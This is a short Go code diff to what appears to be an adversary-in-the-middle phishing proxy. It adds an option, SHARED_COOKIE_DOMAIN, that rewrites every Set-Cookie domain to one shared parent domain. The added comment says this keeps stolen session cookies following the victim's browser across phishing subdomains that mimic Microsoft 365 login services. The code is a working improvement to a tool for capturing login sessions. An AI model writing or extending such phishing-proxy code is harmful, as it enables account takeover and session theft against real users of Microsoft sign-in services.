@@ -20,6 +20,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"os"
 
 	"github.com/PuerkitoBio/goquery"
 	"github.com/andybalholm/brotli"
@@ -2955,6 +2956,15 @@ func (m *ProxyHandler) adjustCookieSettings(ck *http.Cookie, session *service.Pr
 }
 
 func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]service.ProxyServiceDomainConfig, resp *http.Response) {
+	// AiTM flows that span multiple upstream STSes (e.g. login.microsoftonline.com +
+    // login.microsoft.com + login.live.com in the M365 flow) require cookies to follow
+    // the browser across all phish subdomains. When SHARED_COOKIE_DOMAIN is set, every
+    // Set-Cookie's Domain is rewritten to this shared parent so cookies span the
+    // subdomains — mirroring how real MS uses Domain=.microsoft.com across its STSes.
+    if shared := os.Getenv("SHARED_COOKIE_DOMAIN"); shared != "" {
+        ck.Domain = shared
+        return
+    }
 	cDomain := ck.Domain
 	if cDomain == "" {
 		cDomain = resp.Request.Host
